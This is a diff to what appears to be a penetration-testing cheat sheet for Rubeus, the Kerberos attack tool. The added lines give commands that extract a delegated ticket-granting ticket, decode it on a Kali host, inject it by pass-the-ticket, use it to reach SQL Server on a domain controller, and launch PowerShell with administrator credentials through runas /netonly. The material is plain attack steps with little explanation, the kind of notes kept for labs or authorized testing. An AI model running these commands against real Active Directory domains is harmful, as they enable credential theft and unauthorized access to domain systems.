@@ -55,6 +55,20 @@ Some of the utilities:
 # Dump all tickets  
 .\Rubeus.exe dump
 
+
+#####
+# Inject a ticket and use it
+#####
+# Create a base64(ticket.kirbi):
+.\Rubeus.exe tgtdeleg  /nowrap
+# In kali, remove line breaks from base64 blob  
+echo "<base64 blob>" | tr -d \\n  > encode_file
+# Decode base64 ticket into .kirbi file  
+cat encoded_file | base64 -d > ticket.kirbi 
+# Upload the ticket.kirbi to the target, and use it 
+.\Rubeus.exe ptt /ticket:ticket.kirbi
+sqlcmd -S DC01.zeus.corp -E
+
 ########################################  
 # Request a TGT using plaintext credentials  
 ########################################  
@@ -292,6 +306,8 @@ Some of the utilities:
 # Example
 .\Rubeus.exe ptt /ticket:C:\tools\julio.kirbi
 
+
+runas /netonly /user:NAGOYA\Administrator powershell
 ```
 
 
